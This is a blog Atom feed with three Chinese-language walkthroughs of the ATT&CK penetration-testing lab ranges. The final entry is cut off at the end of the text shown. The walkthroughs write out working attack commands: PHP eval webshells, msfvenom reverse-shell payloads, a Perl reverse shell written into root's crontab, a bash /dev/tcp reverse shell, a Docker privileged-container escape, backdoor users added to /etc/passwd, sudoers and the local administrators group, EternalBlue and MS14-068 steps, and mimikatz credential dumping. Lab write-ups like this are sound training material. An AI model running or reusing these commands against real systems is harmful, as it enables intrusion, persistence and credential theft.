<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>admire@</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-20T01:00:26.169Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>admire@</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ATTCK2</title>
    <link href="http://example.com/2024/03/20/ATTCK2/"/>
    <id>http://example.com/2024/03/20/ATTCK2/</id>
    <published>2024-03-20T00:59:41.000Z</published>
    <updated>2024-03-20T01:00:26.169Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>web</p><p>administrator&#x2F;1qaz!QAZ</p><p>其他用户都是 1qaz@WSX</p><p>web IP 192.168.6.192(192.168.6.194)</p><p>内网IP 10.10.10.80</p><p>PC IP 192.168.6.193</p><p>内网IP 10.01.10.201</p><p>DC 内网IP 10.101.10.10</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>探测内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK2/image-20240312163212285.png" class="" title="image-20240312163212285"><p>扫描存活主机端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.6.192 </span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK2/image-20240312164458331.png" class="" title="image-20240312164458331"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.6.193</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK2/image-20240312164512495.png" class="" title="image-20240312164512495"><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>访问 192.168.6.192:7001 </p><p>7001端口是weblogic的默认端口</p><p>使用weblogicTool工具进行测试</p><img src="/2024/03/20/ATTCK2/image-20240312170138391.png" class="" title="image-20240312170138391"><img src="/2024/03/20/ATTCK2/image-20240312170155637.png" class="" title="image-20240312170155637"><p>使用蚁剑连接</p><p>使用CS设置监听器，生成后门exe文件通过蚁剑上传到主机</p><img src="/2024/03/20/ATTCK2/image-20240312170647728.png" class="" title="image-20240312170647728"><img src="/2024/03/20/ATTCK2/image-20240312170658133.png" class="" title="image-20240312170658133"><img src="/2024/03/20/ATTCK2/image-20240312170708608.png" class="" title="image-20240312170708608"><img src="/2024/03/20/ATTCK2/image-20240312170542060.png" class="" title="image-20240312170542060"><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>shell ipconfig</p><p>发现内网网段</p><img src="/2024/03/20/ATTCK2/image-20240312171156724.png" class="" title="image-20240312171156724"><p><strong>使用cs的portcan模块来进行内网其他机器扫描</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portscan 10.10.10.0-10.10.10.255 139,445 arp 1024</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK2/image-20240312172802096.png" class="" title="image-20240312172802096"><p>内网主机IP且139与445端口均开启</p><p>10.10.10.10</p><p>10.10.10.201</p><p>右键-&gt;凭证提权-&gt;抓取明文密码</p><p>获得域内用户密码</p><p>建立SMB监听器</p><img src="/2024/03/20/ATTCK2/image-20240313105519009.png" class="" title="image-20240313105519009"><p>利用获得的账号密码进行横向渗透</p><img src="/2024/03/20/ATTCK2/image-20240313105619570.png" class="" title="image-20240313105619570"><img src="/2024/03/20/ATTCK2/image-20240313105726348.png" class="" title="image-20240313105726348"><p>另一台同理</p><img src="/2024/03/20/ATTCK2/image-20240313105757130.png" class="" title="image-20240313105757130">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;实验环境&quot;&gt;&lt;a href=&quot;#实验环境&quot; class=&quot;headerlink&quot; title=&quot;实验环境&quot;&gt;&lt;/a&gt;实验环境&lt;/h1&gt;&lt;p&gt;web&lt;/p&gt;
&lt;p&gt;administrator&amp;#x2F;1qaz!QAZ&lt;/p&gt;
&lt;p&gt;其他用户都是 1qaz@WSX&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ATTCK4</title>
    <link href="http://example.com/2024/03/20/ATTCK4/"/>
    <id>http://example.com/2024/03/20/ATTCK4/</id>
    <published>2024-03-20T00:55:17.000Z</published>
    <updated>2024-03-20T00:57:10.991Z</updated>
    
    <content type="html"><![CDATA[<p>win7</p><p>douser &#x2F; Dotest123</p><p>web</p><p>ubuntu&#x2F;ubuntu</p><p>DC</p><p>administrator:Test2008</p><p>1qaz!QAZ</p><p>启动docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start ec 17 09 bb da 3d ab ad</span><br></pre></td></tr></table></figure><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313120840471.png" class="" title="image-20240313120840471"><p>端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- 192.168.6.195</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313153253043.png" class="" title="image-20240313153253043"><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p><strong>Tomcat任意写入文件漏洞（CVE-2017-12615）</strong></p><p>哥斯拉生成木马</p><img src="/2024/03/20/ATTCK4/image-20240313161728991.png" class="" title="image-20240313161728991"><img src="/2024/03/20/ATTCK4/image-20240313161710462.png" class="" title="image-20240313161710462"><p>连接成功</p><img src="/2024/03/20/ATTCK4/image-20240313161809260.png" class="" title="image-20240313161809260"><p>进入终端，发现为docker环境</p><img src="/2024/03/20/ATTCK4/image-20240313162007877.png" class="" title="image-20240313162007877"><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><p><strong>Docker Privileged特权逃逸</strong></p><p>操作者使用特权模式启动的容器时，Docker管理员可以通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令</p><p>在容器中时可以通过如下参数检测当前容器是否是以特权模式启动:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep <span class="title class_">CapEff</span></span><br></pre></td></tr></table></figure><p>如果是以特权模式启动的话，CapEff对应的掩码值为0000003fffffffff</p><img src="/2024/03/20/ATTCK4/image-20240313165345144.png" class="" title="image-20240313165345144"><p>方法一</p><p>查看挂载磁盘设备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>在容器内部执行以下命令，将宿主机文件挂载到 &#x2F;test 目录下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /test &amp;&amp; mount /dev/sda1 /test</span><br></pre></td></tr></table></figure><p>设置定时任务</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $&#x27;*/<span class="number">1</span> * * * * perl -e \&#x27;use Socket;$i=<span class="string">&quot;192，168，6，142&quot;</span>;$p=<span class="number">2333</span>;socket(S<span class="punctuation">,</span>PF_INET<span class="punctuation">,</span>SOCK_STREAM<span class="punctuation">,</span>getprotobyname(<span class="string">&quot;tcp&quot;</span>));if(connect(S<span class="punctuation">,</span>sockaddr_in($p<span class="punctuation">,</span>inet_aton($i))))<span class="punctuation">&#123;</span>open(STDIN<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR<span class="punctuation">,</span><span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);<span class="punctuation">&#125;</span>;\&#x27;&#x27; &gt;&gt; /test/var/spool/cron/crontabs/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda1 /mnt</span><br><span class="line"><span class="built_in">chroot</span> /mnt adduser john</span><br></pre></td></tr></table></figure><p>通过新添加的用户登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /mnt</span><br><span class="line">mount /dev/sda1 /mnt</span><br><span class="line">ls /mnt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -le &#x27;print crypt(&quot;123456&quot;,&quot;addedsalt&quot;)&#x27;</span><br><span class="line">echo &quot;aaa:adrla7IBSfTZQ:1003:1003:ub:/root:/bin/bash&quot; &gt;&gt;/mnt/etc/passwd</span><br></pre></td></tr></table></figure><p>其实这个文件有很多条信息，我只单独列出这两条。很清晰的看到每条信息由7个字段组成，由:隔开。<br>字段包含如下信息：<br>1️⃣ 登录用户名<br>2️⃣ 用户密码（进行了别的处理，这里x简单表示，加密后存储在&#x2F;etc&#x2F;shadow文件中）<br>3️⃣ 用户账户的UID（数字形式）<br>4️⃣ 用户账户的组ID（GID）（数字形式）<br>5️⃣ 用户账户的文本描述（称为备注字段）<br>6️⃣ 用户HOME目录位置<br>7️⃣ 用户的默认shell</p><img src="/2024/03/20/ATTCK4/image-20240313174530313.png" class="" title="image-20240313174530313"><p>ssh连接</p><img src="/2024/03/20/ATTCK4/image-20240313174639091.png" class="" title="image-20240313174639091"><h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;aaa ALL=(ALL:ALL) ALL&quot; &gt;&gt; /mnt/etc/sudoers</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313203847644.png" class="" title="image-20240313203847644"><p>当用户执行sudo时，系统会主动寻找&#x2F;etc&#x2F;sudoers文件，判断该用户是否有执行sudo的权限<br>–&gt;确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认<br>–&gt;若密码输入成功，则开始执行sudo后续的命令</p><p>1.root执行sudo时不需要输入密码(sudoers文件中有配置root ALL&#x3D;(ALL) ALL这样一条规则)<br>2.欲切换的身份与执行者的身份相同，不需要输入密码<br>3.&#x2F;etc&#x2F;sudoers文件设置为允许用户在不输入该用户的密码的情况下使用所有命令<br>如设置允许wheel用户组中的用户在不输入该用户的密码的情况下使用所有命令<br>wheel        ALL&#x3D;(ALL)       NOPASSWD: ALL</p><p>提权成功</p><img src="/2024/03/20/ATTCK4/image-20240313203911492.png" class="" title="image-20240313203911492"><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.6.142/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload cmd/unix/reverse_bash</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313204416561.png" class="" title="image-20240313204416561"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 回到后台</span><br><span class="line">background</span><br><span class="line"># 升级会话</span><br><span class="line">sessions -u 1</span><br><span class="line"># 进入meterpreter会话</span><br><span class="line">sessions 2</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313204708141.png" class="" title="image-20240313204708141"><h1 id="域主机渗透"><a href="#域主机渗透" class="headerlink" title="域主机渗透"></a><strong>域主机渗透</strong></h1><h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>添加路由</p><p>第一种方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.183.0 255.255.255.0 2</span><br></pre></td></tr></table></figure><p>第二种方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313211411158.png" class="" title="image-20240313211411158"><p>内网进行主机发现和端口扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp </span><br><span class="line">set session 2</span><br><span class="line">set rhosts 192.168.183.0/24</span><br><span class="line">set ports 139,445,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314082221603.png" class="" title="image-20240314082221603"><p>内网主机均开启了 139，445端口</p><p>192.168.183.129(win7)</p><p>192.168.183.130(DC)</p><h2 id="永恒之蓝攻击"><a href="#永恒之蓝攻击" class="headerlink" title="永恒之蓝攻击"></a>永恒之蓝攻击</h2><p>1、端口445：SMB协议的主要通信端口。在现代版本的Windows操作系统中，SMB协议的通信主要通过TCP&#x2F;IP协议在端口445上进行。端口445上的SMB通信提供了更高的安全性和功能，包括对加密和身份验证的支持。</p><p>2、端口139：早期版本的SMB协议通常在端口139上进行通信。它是NetBIOS Session Service的默认端口，用于在Windows网络上建立会话和进行文件共享。但是，端口139上的SMB通信缺乏加密和身份验证的支持，存在安全风险。因此，在现代网络环境中，推荐使用端口445进行SMB通信。</p><p><strong>建立代理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.toml </span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314113731400.png" class="" title="image-20240314113731400"><p>ubuntu</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.6.142</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[proxies]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7777</span><br><span class="line">plugin = socks5</span><br><span class="line">local_ip = 192.168.183.128</span><br><span class="line">local_port= 7777</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:192.168.6.142:7777</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.183.129</span><br><span class="line">set lhost 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240313214838880.png" class="" title="image-20240313214838880"><p>获得明文密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码:</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314144601087.png" class="" title="image-20240314144601087"><h1 id="域用户提权"><a href="#域用户提权" class="headerlink" title="域用户提权"></a>域用户提权</h1><p><strong>快速检测目标系统未打漏洞补丁</strong></p><p><strong>内核漏洞提权</strong> </p><table><thead><tr><th align="left">漏洞代号</th><th align="left">补丁编号</th><th align="left">适用平台</th><th align="left">用途</th></tr></thead><tbody><tr><td align="left">MS14-058</td><td align="left">KB3000061</td><td align="left">03，08，12，Win7</td><td align="left">本地提权</td></tr><tr><td align="left">MS14-068</td><td align="left">KB3011780</td><td align="left">域控未安装补丁的域内，03，08，12</td><td align="left">域内提权</td></tr><tr><td align="left">MS15-051</td><td align="left">KB3057191</td><td align="left">03，08，12，Win7</td><td align="left">本地提权</td></tr><tr><td align="left">MS16-032</td><td align="left">KB3143141</td><td align="left">08 r2以后，12，Win7</td><td align="left">本地提权</td></tr><tr><td align="left">MS17-010</td><td align="left">KB4013389</td><td align="left">03，08，12，16，win7</td><td align="left">远程注入dll</td></tr><tr><td align="left">CVE-2020-0787</td><td align="left"></td><td align="left">all</td><td align="left">windows全版本提权</td></tr><tr><td align="left">CVE-2020-1472</td><td align="left"></td><td align="left">domain</td><td align="left">域内提权</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo &gt; temp.txt&amp;(for %i in (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314144837576.png" class="" title="image-20240314144837576"><p>获得账号密码 sid 域控名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314163308073.png" class="" title="image-20240314163308073"><p>利用Kerberos 域用户提权漏洞（MS14-068;CVE-2014-6324)来获得域控。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u douser@DEMO.COM -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314160900297.png" class="" title="image-20240314160900297"><p><code>mimikatz # kerberos::ptc TGT_douser@demo.com.ccache</code> 导入票据</p><img src="/2024/03/20/ATTCK4/image-20240314163005819.png" class="" title="image-20240314163005819"><p>成功连接到2008域控，并查看域控c盘</p><p>dir \WIN-ENS2VR5TR3N\C$</p><img src="/2024/03/20/ATTCK4/image-20240314163114678.png" class="" title="image-20240314163114678"><p><strong>使用PsExec工具获取shell &#x2F;&#x2F;PsExec64.exe以管理员权限运行连接域控远程桌面连接</strong></p><p>msf用ms17-010可以直接打通DC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp *#开启远程桌面服务*</span><br></pre></td></tr></table></figure><img src="/2024/03/20/ATTCK4/image-20240314163638043.png" class="" title="image-20240314163638043"><p>添加用户 远程桌面连接即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user cyy 1qazQAZ /add</span><br><span class="line">net localgroup administrators cyy /add</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 192.168.183.130:3389  </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;win7&lt;/p&gt;
&lt;p&gt;douser &amp;#x2F; Dotest123&lt;/p&gt;
&lt;p&gt;web&lt;/p&gt;
&lt;p&gt;ubuntu&amp;#x2F;ubuntu&lt;/p&gt;
&lt;p&gt;DC&lt;/p&gt;
&lt;p&gt;administrator:Test2008&lt;/p&gt;
&lt;p&gt;1qaz!QAZ&lt;/p&gt;
&lt;p&gt;启</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ATTCK1</title>
    <link href="http://example.com/2024/03/12/ATTCK1/"/>
    <id>http://example.com/2024/03/12/ATTCK1/</id>
    <published>2024-03-12T06:56:15.000Z</published>
    <updated>2024-03-12T08:07:53.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透环境"><a href="#渗透环境" class="headerlink" title="渗透环境"></a>渗透环境</h1><p>攻击机 kali 192.168.6.142</p><p>win7双网卡主机</p><p>IP 192.168.6.185(后面关机了 192.168.6.187)</p><p>内网ip 192.168.52.143</p><p>Win2008</p><p>内网ip 192.168.52.138</p><p>Win2K3</p><p>内网ip 192.168.52.141</p><p>拓扑图</p><img src="/2024/03/12/ATTCK1/image-20240312145310552.png" class="" title="image-20240312145310552"><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>扫描存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p>扫描开放的端口</p><img src="/2024/03/12/ATTCK1/image-20240311120532205.png" class="" title="image-20240311120532205"><p>对主机web端口进行目录扫描</p><img src="/2024/03/12/ATTCK1/image-20240311151902874.png" class="" title="image-20240311151902874"><h1 id="渗透主机"><a href="#渗透主机" class="headerlink" title="渗透主机"></a>渗透主机</h1><p>弱口令进入 &#x2F;phpmyadmin&#x2F;index.php</p><p>root</p><p>root</p><h2 id="into-oufile-写-shell"><a href="#into-oufile-写-shell" class="headerlink" title="into oufile 写 shell"></a>into oufile 写 shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure><p>MySQL 对于导入导出的目录是有限制的，只允许指定的目录才能导入导出。</p><p>此处变量值为 <code>NULL</code>，即没设置允许操作的目录，所以没法导出到文件。</p><blockquote><p><code>secure_file_priv</code> 有些设置选项:</p><ul><li><p>如果为空，不做目录限制，即任何目录均可以。</p></li><li><p>如果指定了目录，MySQL 会限制只能从该目录导入、或导出到该目录。目录必须已存在，MySQL 不会自动创建该目录。</p></li><li><p>如果设置为 <code>NULL</code>，MySQL 服务器禁止导入与导出功能。</p></li><li><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></li></ul></blockquote><p>secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限</p><p>如果为空，不做目录限制</p><p>不允许写入</p><img src="/2024/03/12/ATTCK1/image-20240311154059869.png" class="" title="image-20240311154059869"><h2 id="日志文件写-shell"><a href="#日志文件写-shell" class="headerlink" title="日志文件写 shell"></a>日志文件写 shell</h2><p>首先执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br></pre></td></tr></table></figure><p>观察general_log字段是否开启，以及日志路径位置</p><p>如果权限很高更改general_log字段和日志路径位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&#x27;/var/www/html&#x27;;</span><br></pre></td></tr></table></figure><p>这里更改日志路径时报错</p><img src="/2024/03/12/ATTCK1/image-20240311153111237.png" class="" title="image-20240311153111237"><p>操作系统是windows</p><img src="/2024/03/12/ATTCK1/image-20240311154308669.png" class="" title="image-20240311154308669"><p>更改目录试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\ccc.php&#x27;;</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311154814283.png" class="" title="image-20240311154814283"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php eval($_POST[1])?&gt;&#x27; or SLEEP(11);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[999]);?&gt;&quot; &gt;&gt; rrr.php</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311161104739.png" class="" title="image-20240311161104739"><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>msfvenom 生成反向后门</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.142 LPORT=4444 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.6.142 LPORT=4444 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure><p>蚁剑上传exe文件</p><img src="/2024/03/12/ATTCK1/image-20240311163107257.png" class="" title="image-20240311163107257"><p><strong>msf开启监听模块</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp </span><br><span class="line">set LHOST 192.168.6.142</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311161742905.png" class="" title="image-20240311161742905"><p>连接成功</p><img src="/2024/03/12/ATTCK1/image-20240311202749034.png" class="" title="image-20240311202749034"><p>icponfig 发现内网网段</p><img src="/2024/03/12/ATTCK1/image-20240311170212369.png" class="" title="image-20240311170212369"><h1 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h1><p>win7开启路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><h2 id="扫描内网存活主机"><a href="#扫描内网存活主机" class="headerlink" title="扫描内网存活主机"></a>扫描内网存活主机</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set SESSION 1</span><br><span class="line">set RHOSTS 192.168.52.120-150</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311173613245.png" class="" title="image-20240311173613245"><p>内网存活两台主机 </p><p>192.168.52.138</p><p>192.168.52.141</p><h2 id="扫描内网存活主机端口"><a href="#扫描内网存活主机端口" class="headerlink" title="扫描内网存活主机端口"></a>扫描内网存活主机端口</h2><p>添加一条基于 Session 的路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">添加路由：run autoroute -s 192.168.52.0/24</span><br><span class="line">查看路由：run autoroute -p</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用添加的路由进行内网主机和端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内网进行主机发现和端口扫描：use auxiliary/scanner/portscan/tcp </span><br><span class="line">set session 1</span><br><span class="line">set rhosts 192.168.52.135-145</span><br><span class="line">set ports 139,445,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure><img src="/2024/03/12/ATTCK1/image-20240311204535432.png" class="" title="image-20240311204535432"><p>扫描结果</p><img 